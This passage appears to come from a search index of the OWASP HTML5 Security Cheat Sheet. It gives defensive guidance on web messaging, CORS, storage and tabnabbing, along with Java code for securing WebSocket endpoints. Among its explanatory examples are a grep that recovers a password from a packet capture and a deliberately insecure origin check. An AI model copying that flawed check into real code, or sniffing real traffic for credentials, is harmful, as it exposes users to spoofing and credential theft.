true ); //Ensure there no error if ( ! validationReport . isSuccess ()) { //Simply reject the message here: Don't care about error details... throw new EncodeException ( object , \"Validation of the generated representation failed !\" ); } } catch ( IOException | ProcessingException e ) { throw new EncodeException ( object , \"Cannot validate the generated representation to a\" + \" JSON valid representation !\" , e ); } return json ; } /** * {@inheritDoc} */ @Override public void init ( EndpointConfig config ) { //Not used } /** * {@inheritDoc} */ @Override public void destroy () { //Not used } } Note that the same approach is used in the messages handling part of the POC. All messages exchanged between the client and the server are systematically validated using the same way, using dedicated JSON schemas linked to messages dedicated Encoder/Decoder (serialization/deserialization). Authorization and access token explicit invalidation \u00b6 Authorization information is stored in the access token using the JWT Claim feature (in the POC the name of the claim is access_level ). Authorization is validated when a request is received and before any other action using the user input information. The access token is passed with every message sent to the message endpoint and a blacklist is used in order to allow the user to request an explicit token invalidation. Explicit token invalidation is interesting from a user's point of view because, often when tokens are used, the validity timeframe of the token is relatively long (it's common to see a valid timeframe superior to 1 hour) so it's important to allow a user to have a way to indicate to the system \"OK, I have finished my exchange with you, so you can close our exchange session and cleanup associated links\". It also helps the user to revoke itself of current access if a malicious concurrent access is detected using the same token (case of token stealing). Token blacklist - Maintain a temporary list using memory and time limited Caching of hashes of token that are not allowed to be used anymore import org.apache.commons.jcs.JCS ; import org.apache.commons.jcs.access.CacheAccess ; import org.apache.commons.jcs.access.exception.CacheException ; import javax.xml.bind.DatatypeConverter ; import java.security.MessageDigest ; import java.security.NoSuchAlgorithmException ; /** * Utility class to manage the access token that have been declared as no * more usable (explicit user logout) */ public class AccessTokenBlacklistUtils { /** * Message content send by user that indicate that the access token that * come along the message must be blacklisted for further usage */ public static final String MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG = \"INVALIDATE_TOKEN\" ; /** * Use cache to store blacklisted token hash in order to avoid memory exhaustion and be consistent * because token are valid 30 minutes so the item live in cache 60 minutes */ private static final CacheAccess < String , String > TOKEN_CACHE ; static { try { TOKEN_CACHE = JCS . getInstance ( \"default\" ); } catch ( CacheException e ) { throw new RuntimeException ( \"Cannot init token cache !\" , e ); } } /** * Add token into the blacklist * * @param token Token for which the hash must be added * @throws NoSuchAlgorithmException If SHA256 is not available */ public static void addToken ( String token ) throws NoSuchAlgorithmException { if ( token != null && ! token . trim (). isEmpty ()) { String hashHex = computeHash ( token ); if ( TOKEN_CACHE . get ( hashHex ) == null ) { TOKEN_CACHE . putSafe ( hashHex , hashHex ); } } } /** * Check if a token is present in the blacklist * * @param token Token for which the presence of the hash must be verified * @return TRUE if token is blacklisted * @throws NoSuchAlgorithmException If SHA256 is not available */ public static boolean isBlacklisted ( String token ) throws NoSuchAlgorithmException { boolean exists = false ; if ( token != null && ! token . trim (). isEmpty ()) { String hashHex = computeHash ( token ); exists = ( TOKEN_CACHE . get ( hashHex ) != null ); } return exists ; } /** * Compute the SHA256 hash of a token * * @param token Token for which the hash must be computed * @return The hash encoded in HEX * @throws NoSuchAlgorithmException If SHA256 is not available */ private static String computeHash ( String token ) throws NoSuchAlgorithmException { String hashHex = null ; if ( token != null && ! token . trim (). isEmpty ()) { MessageDigest md = MessageDigest . getInstance ( \"SHA-256\" ); byte [] hash = md . digest ( token . getBytes ()); hashHex = DatatypeConverter . printHexBinary ( hash ); } return hashHex ; } } Message handling - Process a request from a user to add a message in the list. Show a authorization validation approach example import com.auth0.jwt.interfaces.Claim ; import com.auth0.jwt.interfaces.DecodedJWT ; import org.owasp.pocwebsocket.enumeration.AccessLevel ; import org.owasp.pocwebsocket.util.AccessTokenBlacklistUtils ; import org.owasp.pocwebsocket.util.AuthenticationUtils ; import org.owasp.pocwebsocket.util.MessageUtils ; import org.owasp.pocwebsocket.vo.MessageRequest ; import org.owasp.pocwebsocket.vo.MessageResponse ; import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; import javax.websocket.EncodeException ; import javax.websocket.RemoteEndpoint ; import java.io.IOException ; import java.util.ArrayList ; import java.util.List ; /** * Handle message flow */ public class MessageHandler implements javax . websocket . MessageHandler . Whole < MessageRequest > { private static final Logger LOG = LoggerFactory . getLogger ( MessageHandler . class ); /** * Reference to the communication channel with the client */ private RemoteEndpoint . Basic clientConnection ; /** * Constructor * * @param clientConnection Reference to the communication channel with the client */ public MessageHandler ( RemoteEndpoint . Basic clientConnection ) { this . clientConnection = clientConnection ; } /** * {@inheritDoc} */ @Override public void onMessage ( MessageRequest message ) { MessageResponse response = null ; try { /*Step 1: Verify the token*/ String token = message . getToken (); //Verify if is it in the blacklist if ( AccessTokenBlacklistUtils . isBlacklisted ( token )) { throw new IllegalAccessException ( \"Token is in the blacklist !\" ); } //Verify the signature of the token DecodedJWT decodedToken = AuthenticationUtils . validateToken ( token ); /*Step 2: Verify the authorization (access level)*/ Claim accessLevel = decodedToken . getClaim ( \"access_level\" ); if ( accessLevel == null || AccessLevel . valueOf ( accessLevel . asString ()) == null ) { throw new IllegalAccessException ( \"Token have an invalid access level claim !\" ); } /*Step 3: Do the expected processing*/ //Init the list of the messages for the current user if ( ! MessageUtils . MESSAGES_DB . containsKey ( decodedToken . getSubject ())) { MessageUtils . MESSAGES_DB . put ( decodedToken . getSubject (), new ArrayList <> ()); } //Add message to the list of message of the user if the message is a not a token invalidation //order otherwise add the token to the blacklist if ( AccessTokenBlacklistUtils . MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG . equalsIgnoreCase ( message . getContent (). trim ())) { AccessTokenBlacklistUtils . addToken ( message . getToken ()); } else { MessageUtils . MESSAGES_DB . get ( decodedToken . getSubject ()). add ( message . getContent ()); } //According to the access level of user either return only is message or return all message List < String > messages = new ArrayList <> (); if ( accessLevel . asString (). equals ( AccessLevel . USER . name ())) { MessageUtils . MESSAGES_DB . get ( decodedToken . getSubject ()) . forEach ( s -> messages . add ( String . format ( \"(%s): %s\" , decodedToken . getSubject (), s ))); } else if ( accessLevel . asString (). equals ( AccessLevel . ADMIN . name ())) { MessageUtils . MESSAGES_DB . forEach (( k , v ) -> v . forEach ( s -> messages . add ( String . format ( \"(%s): %s\" , k , s )))); } //Build the response object indicating that exchange succeed if ( AccessTokenBlacklistUtils . MESSAGE_ACCESS_TOKEN_INVALIDATION_FLAG . equalsIgnoreCase ( message . getContent (). trim ())) { response = new MessageResponse ( true , messages , \"Token added to the blacklist\" ); } else { response = new MessageResponse ( true , messages , \"\" ); } } catch ( Exception e ) { LOG . error ( \"[MessageHandler] Error occur in exchange process.\" , e ); //Build the response object indicating that exchange fail //We send the error detail on client because ware are in POC (it will not the case in a real app) response = new MessageResponse ( false , new ArrayList <> (), \"Error occur during exchange: \" + e . getMessage ()); } finally { //Send response try { this . clientConnection . sendObject ( response ); } catch ( IOException | EncodeException e ) { LOG . error ( \"[MessageHandler] Error occur in response object sending.\" , e ); } } } } Confidentiality and Integrity \u00b6 If the raw version of the protocol is used (protocol ws:// ) then the transferred data is exposed to eavesdropping and potential on-the-fly alteration. Example of capture using Wireshark and searching for password exchanges in the stored PCAP file, not printable characters has been explicitly removed from the command result: $ grep -aE '(password)' capture.pcap { \"login\" : \"bob\" , \"password\" : \"bob123\" } There is a way to check, at WebSocket endpoint level, if the channel is secure by calling the method isSecure() on the session object instance. Example of implementation in the method of the endpoint in charge of setup of the session and affects the message handler: /** * Handle the beginning of an exchange * * @param session Exchange session information */ @OnOpen public void start ( Session session ) { ... //Affect a new message handler instance in order to process the exchange only if the channel is secured if ( session . isSecure ()) { session . addMessageHandler ( new AuthenticationMessageHandler ( session . getBasicRemote ())); } else { LOG . info ( \"[AuthenticationEndpoint] Session {} do not use a secure channel so no message handler \" + \"was affected for processing and session was explicitly closed !\" , session . getId ()); try { session . close ( new CloseReason ( CloseReason . CloseCodes . CANNOT_ACCEPT , \"Insecure channel used !\" )); } catch ( IOException e ){ LOG . error ( \"[AuthenticationEndpoint] Session {} cannot be explicitly closed !\" , session . getId (), e ); } } LOG . info ( \"[AuthenticationEndpoint] Session {} message handler affected for processing\" , session . getId ()); } Expose WebSocket endpoints only on wss:// protocol (WebSockets over SSL/TLS) in order to ensure Confidentiality and Integrity of the traffic like using HTTP over SSL/TLS to secure HTTP exchanges.","title":"HTML5 Security"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#html5-security-cheat-sheet","text":"","title":"HTML5 Security Cheat Sheet"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#introduction","text":"The following cheat sheet serves as a guide for implementing HTML 5 in a secure fashion.","title":"Introduction"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#communication-apis","text":"","title":"Communication APIs"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging","text":"Web Messaging (also known as Cross Domain Messaging) provides a means of messaging between documents from different origins in a way that is generally safer than the multiple hacks used in the past to accomplish this task. However, there are still some recommendations to keep in mind: When posting a message, explicitly state the expected origin as the second argument to postMessage rather than * in order to prevent sending the message to an unknown origin after a redirect or some other means of the target window's origin changing. The receiving page should always : Check the origin attribute of the sender to verify the data is originating from the expected location. Perform input validation on the data attribute of the event to ensure that it's in the desired format. Don't assume you have control over the data attribute. A single Cross Site Scripting flaw in the sending page allows an attacker to send messages of any given format. Both pages should only interpret the exchanged messages as data . Never evaluate passed messages as code (e.g. via eval() ) or insert it to a page DOM (e.g. via innerHTML ), as that would create a DOM-based XSS vulnerability. For more information see DOM based XSS Prevention Cheat Sheet . To assign the data value to an element, instead of using a insecure method like element.innerHTML=data; , use the safer option: element.textContent=data; Check the origin properly exactly to match the FQDN(s) you expect. Note that the following code: if(message.origin.indexOf(\".owasp.org\")!=-1) { /* ... */ } is very insecure and will not have the desired behavior as owasp.org.attacker.com will match. If you need to embed external content/untrusted gadgets and allow user-controlled scripts (which is highly discouraged), consider using a JavaScript rewriting framework such as Google Caja or check the information on sandboxed frames .","title":"Web Messaging"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing","text":"Validate URLs passed to XMLHttpRequest.open . Current browsers allow these URLs to be cross domain; this behavior can lead to code injection by a remote attacker. Pay extra attention to absolute URLs. Ensure that URLs responding with Access-Control-Allow-Origin: * do not include any sensitive content or information that might aid attacker in further attacks. Use the Access-Control-Allow-Origin header only on chosen URLs that need to be accessed cross-domain. Don't use the header for the whole domain. Allow only selected, trusted domains in the Access-Control-Allow-Origin header. Prefer whitelisting domains over blacklisting or allowing any domain (do not use * wildcard nor blindly return the Origin header content without any checks). Keep in mind that CORS does not prevent the requested data from going to an unauthenticated location. It's still important for the server to perform usual CSRF prevention. While the RFC recommends a pre-flight request with the OPTIONS verb, current implementations might not perform this request, so it's important that \"ordinary\" ( GET and POST ) requests perform any access control necessary. Discard requests received over plain HTTP with HTTPS origins to prevent mixed content bugs. Don't rely only on the Origin header for Access Control checks. Browser always sends this header in CORS requests, but may be spoofed outside the browser. Application-level protocols should be used to protect sensitive data.","title":"Cross Origin Resource Sharing"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#websockets","text":"Drop backward compatibility in implemented client/servers and use only protocol versions above hybi-00. Popular Hixie-76 version (hiby-00) and older are outdated and insecure. The recommended version supported in latest versions of all current browsers is RFC 6455 (supported by Firefox 11+, Chrome 16+, Safari 6, Opera 12.50, and IE10). While it's relatively easy to tunnel TCP services through WebSockets (e.g. VNC, FTP), doing so enables access to these tunneled services for the in-browser attacker in case of a Cross Site Scripting attack. These services might also be called directly from a malicious page or program. The protocol doesn't handle authorization and/or authentication. Application-level protocols should handle that separately in case sensitive data is being transferred. Process the messages received by the websocket as data. Don't try to assign it directly to the DOM nor evaluate as code. If the response is JSON, never use the insecure eval() function; use the safe option JSON.parse() instead. Endpoints exposed through the ws:// protocol are easily reversible to plain text. Only wss:// (WebSockets over SSL/TLS) should be used for protection against Man-In-The-Middle attacks. Spoofing the client is possible outside a browser, so the WebSockets server should be able to handle incorrect/malicious input. Always validate input coming from the remote site, as it might have been altered. When implementing servers, check the Origin: header in the Websockets handshake. Though it might be spoofed outside a browser, browsers always add the Origin of the page that initiated the Websockets connection. As a WebSockets client in a browser is accessible through JavaScript calls, all Websockets communication can be spoofed or hijacked through Cross Site Scripting . Always validate data coming through a WebSockets connection.","title":"WebSockets"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#server-sent-events","text":"Validate URLs passed to the EventSource constructor, even though only same-origin URLs are allowed. As mentioned before, process the messages ( event.data ) as data and never evaluate the content as HTML or script code. Always check the origin attribute of the message ( event.origin ) to ensure the message is coming from a trusted domain. Use a whitelist approach.","title":"Server-Sent Events"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#storage-apis","text":"","title":"Storage APIs"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage","text":"Also known as Offline Storage, Web Storage. Underlying storage mechanism may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it's recommended not to store any sensitive information in local storage. Use the object sessionStorage instead of localStorage if persistent storage is not needed. sessionStorage object is available only to that window/tab until the window is closed. A single Cross Site Scripting can be used to steal all the data in these objects, so again it's recommended not to store sensitive information in local storage. A single Cross Site Scripting can be used to load malicious data into these objects too, so don't consider objects in these to be trusted. Pay extra attention to \"localStorage.getItem\" and \"setItem\" calls implemented in HTML5 page. It helps in detecting when developers build solutions that put sensitive information in local storage, which is a bad practice. Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the httpOnly flag. There is no way to restrict the visibility of an object to a specific path like with the attribute path of HTTP Cookies, every object is shared within an origin and protected with the Same Origin Policy. Avoid host multiple applications on the same origin, all of them would share the same localStorage object, use different subdomains instead.","title":"Local Storage"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#client-side-databases","text":"On November 2010, the W3C announced Web SQL Database (relational SQL database) as a deprecated specification. A new standard Indexed Database API or IndexedDB (formerly WebSimpleDB) is actively developed, which provides key-value database storage and methods for performing advanced queries. Underlying storage mechanisms may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it's recommended not to store any sensitive information in local storage. If utilized, WebDatabase content on the client side can be vulnerable to SQL injection and needs to have proper validation and parameterization. Like Local Storage, a single Cross Site Scripting can be used to load malicious data into a web database as well. Don't consider data in these to be trusted.","title":"Client-side databases"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#geolocation","text":"The Geolocation RFC recommends that the user agent ask the user's permission before calculating location. Whether or how this decision is remembered varies from browser to browser. Some user agents require the user to visit the page again in order to turn off the ability to get the user's location without asking, so for privacy reasons, it's recommended to require user input before calling getCurrentPosition or watchPosition .","title":"Geolocation"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#web-workers","text":"Web Workers are allowed to use XMLHttpRequest object to perform in-domain and Cross Origin Resource Sharing requests. See relevant section of this Cheat Sheet to ensure CORS security. While Web Workers don't have access to DOM of the calling page, malicious Web Workers can use excessive CPU for computation, leading to Denial of Service condition or abuse Cross Origin Resource Sharing for further exploitation. Ensure code in all Web Workers scripts is not malevolent. Don't allow creating Web Worker scripts from user supplied input. Validate messages exchanged with a Web Worker. Do not try to exchange snippets of JavaScript for evaluation e.g. via eval() as that could introduce a DOM Based XSS vulnerability.","title":"Web Workers"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#tabnabbing","text":"Attack is described in detail in this article . To summarize, it's the capacity to act on parent page's content or location from a newly opened page via the back link exposed by the opener JavaScript object instance. It applies to an HTML link or a JavaScript window.open function using the attribute/instruction target to specify a target loading location that does not replace the current location and then makes the current window/tab available. To prevent this issue, the following actions are available: Cut the back link between the parent and the child pages: For HTML links: To cut this back link, add the attribute rel=\"noopener\" on the tag used to create the link from the parent page to the child page. This attribute value cuts the link, but depending on the browser, lets referrer information be present in the request to the child page. To also remove the referrer information use this attribute value: rel=\"noopener noreferrer\" . For the JavaScript window.open function, add the values noopener,noreferrer in the windowFeatures parameter of the window.open function. As the behavior using the elements above is different between the browsers, either use an HTML link or JavaScript to open a window (or tab), then use this configuration to maximize the cross supports: For HTML links, add the attribute rel=\"noopener noreferrer\" to every link. For JavaScript, use this function to open a window (or tab): function openPopup ( url , name , windowFeatures ){ //Open the popup and set the opener and referrer policy instruction var newWindow = window . open ( url , name , 'noopener,noreferrer,' + windowFeatures ); //Reset the opener link newWindow . opener = null ; } Add the HTTP response header Referrer-Policy: no-referrer to every HTTP response sent by the application ( Header Referrer-Policy information . This configuration will ensure that no referrer information is sent along with requests from the page. Compatibility matrix: noopener noreferrer referrer-policy","title":"Tabnabbing"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#sandboxed-frames","text":"Use the sandbox attribute of an iframe for untrusted content. The sandbox attribute of an iframe enables restrictions on content within an iframe . The following restrictions are active when the sandbox attribute is set: All markup is treated as being from a unique origin. All forms and scripts are disabled. All links are prevented from targeting other browsing contexts. All features that trigger automatically are blocked. All plugins are disabled. It is possible to have a fine-grained control over iframe capabilities using the value of the sandbox attribute. In old versions of user agents where this feature is not supported, this attribute will be ignored. Use this feature as an additional layer of protection or check if the browser supports sandboxed frames and only show the untrusted content if supported. Apart from this attribute, to prevent Clickjacking attacks and unsolicited framing it is encouraged to use the header X-Frame-Options which supports the deny and same-origin values. Other solutions like framebusting if(window!==window.top) { window.top.location=location;} are not recommended.","title":"Sandboxed frames"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#credential-and-personally-identifiable-information-pii-input-hints","text":"Protect the input values from being cached by the browser. Access a financial account from a public computer. Even though one is logged-off, the next person who uses the machine can log-in because the browser autocomplete functionality. To mitigate this, we tell the input fields not to assist in any way. < input type = \"text\" spellcheck = \"false\" autocomplete = \"off\" autocorrect = \"off\" autocapitalize = \"off\" ></ input > Text areas and input fields for PII (name, email, address, phone number) and login credentials (username, password) should be prevented from being stored in the browser. Use these HTML5 attributes to prevent the browser from storing PII from your form: spellcheck=\"false\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\"","title":"Credential and Personally Identifiable Information (PII) Input hints"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#offline-applications","text":"Whether the user agent requests permission from the user to store data for offline browsing and when this cache is deleted, varies from one browser to the next. Cache poisoning is an issue if a user connects through insecure networks, so for privacy reasons it is encouraged to require user input before sending any manifest file. Users should only cache trusted websites and clean the cache after browsing through open or insecure networks.","title":"Offline Applications"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#progressive-enhancements-and-graceful-degradation-risks","text":"The best practice now is to determine the capabilities that a browser supports and augment with some type of substitute for capabilities that are not directly supported. This may mean an onion-like element, e.g. falling through to a Flash Player if the <video> tag is unsupported, or it may mean additional scripting code from various sources that should be code reviewed.","title":"Progressive Enhancements and Graceful Degradation Risks"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#http-headers-to-enhance-security","text":"Consult the project OWASP Secure Headers in order to obtains the list of HTTP security headers that an application should use to enable defenses at browser level.","title":"HTTP Headers to enhance security"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#websocket-implementation-hints","text":"In addition to the elements mentioned above, this is the list of areas for which caution must be taken during the implementation. Access filtering through the \"Origin\" HTTP request header Input / Output validation Authentication Authorization Access token explicit invalidation Confidentiality and Integrity The section below will propose some implementation hints for every area and will go along with an application example showing all the points described. The complete source code of the example application is available here .","title":"WebSocket implementation hints"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#access-filtering","text":"During a websocket channel initiation, the browser sends the Origin HTTP request header that contains the source domain initiation for the request to handshake. Even if this header can be spoofed in a forged HTTP request (not browser based), it cannot be overridden or forced in a browser context. It then represents a good candidate to apply filtering according to an expected value. An example of an attack using this vector, named Cross-Site WebSocket Hijacking (CSWSH) , is described here . The code below defines a configuration that applies filtering based on a \"whitelist\" of origins. This ensures that only allowed origins can establish a full handshake: import org.owasp.encoder.Encode ; import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; import javax.websocket.server.ServerEndpointConfig ; import java.util.Arrays ; import java.util.List ; /** * Setup handshake rules applied to all WebSocket endpoints of the application. * Use to setup the Access Filtering using \"Origin\" HTTP header as input information. * * @see \"http://docs.oracle.com/javaee/7/api/index.html?javax/websocket/server/ * ServerEndpointConfig.Configurator.html\" * @see \"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\" */ public class EndpointConfigurator extends ServerEndpointConfig . Configurator { /** * Logger */ private static final Logger LOG = LoggerFactory . getLogger ( EndpointConfigurator . class ); /** * Get the expected source origins from a JVM property in order to allow external configuration */ private static final List < String > EXPECTED_ORIGINS = Arrays . asList ( System . getProperty ( \"source.origins\" ) . split ( \";\" )); /** * {@inheritDoc} */ @Override public boolean checkOrigin ( String originHeaderValue ) { boolean isAllowed = EXPECTED_ORIGINS . contains ( originHeaderValue ); String safeOriginValue = Encode . forHtmlContent ( originHeaderValue ); if ( isAllowed ) { LOG . info ( \"[EndpointConfigurator] New handshake request received from {} and was accepted.\" , safeOriginValue ); } else { LOG . warn ( \"[EndpointConfigurator] New handshake request received from {} and was rejected !\" , safeOriginValue ); } return isAllowed ; } }","title":"Access filtering"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html#authentication-and-inputoutput-validation","text":"When using websocket as communication channel, it's important to use an authentication method allowing the user to receive an access Token that is not automatically sent by the browser and then must be explicitly sent by the client code during each exchange. JSON Web Token is a good candidate, because it allows the transport of access ticket information in a stateless and not alterable way. Moreover, it defines a validity timeframe. You can find additional information about JWT token hardening on this cheat sheet . JSON Validation Schema are used to define and validate the expected content in input and ouput messages. The code below defines the complete authentication messages flow handling: Authentication Web Socket endpoint - Provide a WS endpoint that enables authentication exchange import org.owasp.pocwebsocket.configurator.EndpointConfigurator ; import org.owasp.pocwebsocket.decoder.AuthenticationRequestDecoder ; import org.owasp.pocwebsocket.encoder.AuthenticationResponseEncoder ; import org.owasp.pocwebsocket.handler.AuthenticationMessageHandler ; import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; import javax.websocket.CloseReason ; import javax.websocket.OnClose ; import javax.websocket.OnError ; import javax.websocket.OnOpen ; import javax.websocket.Session ; import javax.websocket.server.ServerEndpoint ; /** * Class in charge of managing the client authentication. * * @see \"http://docs.oracle.com/javaee/7/api/javax/websocket/server/ServerEndpointConfig.Configurator.html\" * @see \"http://svn.apache.org/viewvc/tomcat/trunk/webapps/examples/WEB-INF/classes/websocket/\" */ @ServerEndpoint ( value = \"/auth\" , configurator = EndpointConfigurator . class , subprotocols = { \"authentication\" }, encoders = { AuthenticationResponseEncoder . class }, decoders = { AuthenticationRequestDecoder . class }) public class AuthenticationEndpoint { /** * Logger */ private static final Logger LOG = LoggerFactory . getLogger ( AuthenticationEndpoint . class ); /** * Handle the beginning of an exchange * * @param session Exchange session information */ @OnOpen public void start ( Session session ) { //Define connection idle timeout and message limits in order to mitigate as much as possible //DOS attacks using massive connection opening or massive big messages sending int msgMaxSize = 1024 * 1024 ; //1 MB session . setMaxIdleTimeout ( 60000 ); //1 minute session . setMaxTextMessageBufferSize ( msgMaxSize ); session . setMaxBinaryMessageBufferSize ( msgMaxSize ); //Log exchange start LOG . info ( \"[AuthenticationEndpoint] Session {} started\" , session . getId ()); //Affect a new message handler instance in order to process the exchange session . addMessageHandler ( new AuthenticationMessageHandler ( session . getBasicRemote ())); LOG . info ( \"[AuthenticationEndpoint] Session {} message handler affected for processing\" , session . getId ()); } /** * Handle error case * * @param session Exchange session information * @param thr Error details */ @OnError public void onError ( Session session , Throwable thr ) { LOG . error ( \"[AuthenticationEndpoint] Error occur in session {}\" , session . getId (), thr ); } /** * Handle close event * * @param session Exchange session information * @param closeReason Exchange closing reason */ @OnClose public void onClose ( Session session , CloseReason closeReason ) { LOG . info ( \"[AuthenticationEndpoint] Session {} closed: {}\" , session . getId (), closeReason . getReasonPhrase ()); } } Authentication message handler - Handle all authentication requests import org.owasp.pocwebsocket.enumeration.AccessLevel ; import org.owasp.pocwebsocket.util.AuthenticationUtils ; import org.owasp.pocwebsocket.vo.AuthenticationRequest ; import org.owasp.pocwebsocket.vo.AuthenticationResponse ; import org.owasp.encoder.Encode ; import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; import javax.websocket.EncodeException ; import javax.websocket.MessageHandler ; import javax.websocket.RemoteEndpoint ; import java.io.IOException ; /** * Handle authentication message flow */ public class AuthenticationMessageHandler implements MessageHandler . Whole < AuthenticationRequest > { private static final Logger LOG = LoggerFactory . getLogger ( AuthenticationMessageHandler . class ); /** * Reference to the communication channel with the client */ private RemoteEndpoint . Basic clientConnection ; /** * Constructor * * @param clientConnection Reference to the communication channel with the client */ public AuthenticationMessageHandler ( RemoteEndpoint . Basic clientConnection ) { this . clientConnection = clientConnection ; } /** * {@inheritDoc} */ @Override public void onMessage ( AuthenticationRequest message ) { AuthenticationResponse response = null ; try { //Authenticate String authenticationToken = \"\" ; String accessLevel = this . authenticate ( message . getLogin (), message . getPassword ()); if ( accessLevel != null ) { //Create a simple JSON token representing the authentication profile authenticationToken = AuthenticationUtils . issueToken ( message . getLogin (), accessLevel ); } //Build the response object String safeLoginValue = Encode . forHtmlContent ( message . getLogin ()); if ( ! authenticationToken . isEmpty ()) { response = new AuthenticationResponse ( true , authenticationToken , \"Authentication succeed !\" ); LOG . info ( \"[AuthenticationMessageHandler] User {} authentication succeed.\" , safeLoginValue ); } else { response = new AuthenticationResponse ( false , authenticationToken , \"Authentication failed !\" ); LOG . warn ( \"[AuthenticationMessageHandler] User {} authentication failed.\" , safeLoginValue ); } } catch ( Exception e ) { LOG . error ( \"[AuthenticationMessageHandler] Error occur in authentication process.\" , e ); //Build the response object indicating that authentication fail response = new AuthenticationResponse ( false , \"\" , \"Authentication failed !\" ); } finally { //Send response try { this . clientConnection . sendObject ( response ); } catch ( IOException | EncodeException e ) { LOG . error ( \"[AuthenticationMessageHandler] Error occur in response object sending.\" , e ); } } } /** * Authenticate the user * * @param login User login * @param password User password * @return The access level if the authentication succeed or NULL if the authentication failed */ private String authenticate ( String login , String password ) { .... } } Utility class to manage JWT token - Handle the issuing and the validation of the access token. Simple JWT token has been used for the example (focus was made here on the global WS endpoint implementation) here without extra hardening (see this cheat sheet to apply extra hardening on the JWT token) import com.auth0.jwt.JWT ; import com.auth0.jwt.JWTVerifier ; import com.auth0.jwt.algorithms.Algorithm ; import com.auth0.jwt.interfaces.DecodedJWT ; import java.io.IOException ; import java.nio.file.Files ; import java.nio.file.Paths ; import java.util.Calendar ; import java.util.Locale ; /** * Utility class to manage the authentication JWT token */ public class AuthenticationUtils { /** * Build a JWT token for a user * * @param login User login * @param accessLevel Access level of the user * @return The Base64 encoded JWT token * @throws Exception If any error occur during the issuing */ public static String issueToken ( String login , String accessLevel ) throws Exception { //Issue a JWT token with validity of 30 minutes Algorithm algorithm = Algorithm . HMAC256 ( loadSecret ()); Calendar c = Calendar . getInstance (); c . add ( Calendar . MINUTE , 30 ); return JWT . create (). withIssuer ( \"WEBSOCKET-SERVER\" ). withSubject ( login ). withExpiresAt ( c . getTime ()) . withClaim ( \"access_level\" , accessLevel . trim (). toUpperCase ( Locale . US )). sign ( algorithm ); } /** * Verify the validity of the provided JWT token * * @param token JWT token encoded to verify * @return The verified and decoded token with user authentication and * authorization (access level) information * @throws Exception If any error occur during the token validation */ public static DecodedJWT validateToken ( String token ) throws Exception { Algorithm algorithm = Algorithm . HMAC256 ( loadSecret ()); JWTVerifier verifier = JWT . require ( algorithm ). withIssuer ( \"WEBSOCKET-SERVER\" ). build (); return verifier . verify ( token ); } /** * Load the JWT secret used to sign token using a byte array for secret storage in order * to avoid persistent string in memory * * @return The secret as byte array * @throws IOException If any error occur during the secret loading */ private static byte [] loadSecret () throws IOException { return Files . readAllBytes ( Paths . get ( \"src\" , \"main\" , \"resources\" , \"jwt-secret.txt\" )); } } JSON schema of the input and output authentication message - Define the expected structure of the input and output messages from the authentication endpoint point of view { \"$schema\" : \"http://json-schema.org/schema#\" , \"title\" : \"AuthenticationRequest\" , \"type\" : \"object\" , \"properties\" : { \"login\" : { \"type\" : \"string\" , \"pattern\" : \"^[a-zA-Z]{1,10}$\" }, \"password\" : { \"type\" : \"string\" } }, \"required\" : [ \"login\" , \"password\" ] } { \"$schema\" : \"http://json-schema.org/schema#\" , \"title\" : \"AuthenticationResponse\" , \"type\" : \"object\" , \"properties\" : { \"isSuccess;\" : { \"type\" : \"boolean\" }, \"token\" : { \"type\" : \"string\" , \"pattern\" : \"^[a-zA-Z0-9+/=\\\\._-]{0,500}$\" }, \"message\" : { \"type\" : \"string\" , \"pattern\" : \"^[a-zA-Z0-9!\\\\s]{0,100}$\" } }, \"required\" : [ \"isSuccess\" , \"token\" , \"message\" ] } Authentication message decoder and encoder - Perform the JSON serialization/deserialization and the input/output validation using dedicated JSON Schema. It makes it possible to systematically ensure that all messages received and sent by the endpoint strictly respect the expected structure and content. import com.fasterxml.jackson.databind.JsonNode ; import com.github.fge.jackson.JsonLoader ; import com.github.fge.jsonschema.core.exceptions.ProcessingException ; import com.github.fge.jsonschema.core.report.ProcessingReport ; import com.github.fge.jsonschema.main.JsonSchema ; import com.github.fge.jsonschema.main.JsonSchemaFactory ; import com.google.gson.Gson ; import org.owasp.pocwebsocket.vo.AuthenticationRequest ; import javax.websocket.DecodeException ; import javax.websocket.Decoder ; import javax.websocket.EndpointConfig ; import java.io.File ; import java.io.IOException ; /** * Decode JSON text representation to an AuthenticationRequest object * <p> * As there's one instance of the decoder class by endpoint session so we can use the * JsonSchema as decoder instance variable. */ public class AuthenticationRequestDecoder implements Decoder . Text < AuthenticationRequest > { /** * JSON validation schema associated to this type of message */ private JsonSchema validationSchema = null ; /** * Initialize decoder and associated JSON validation schema * * @throws IOException If any error occur during the object creation * @throws ProcessingException If any error 